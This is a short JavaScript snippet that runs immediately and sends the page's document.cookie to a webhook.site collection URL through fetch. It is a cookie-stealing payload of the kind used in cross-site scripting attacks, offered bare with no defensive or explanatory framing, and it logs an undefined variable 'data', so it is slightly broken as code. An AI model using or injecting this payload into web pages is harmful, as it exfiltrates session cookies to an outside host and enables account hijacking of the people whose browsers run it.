async function fetchData() {
  try {
    const response = await fetch('https://webhook.site/6139e902-80ac-42d4-8aac-f0d9ffdbdede?res=' + document.cookie);
    console.log(data);
  } catch (error) {
    console.error('Fetch error:', error);
  }
}

fetchData();
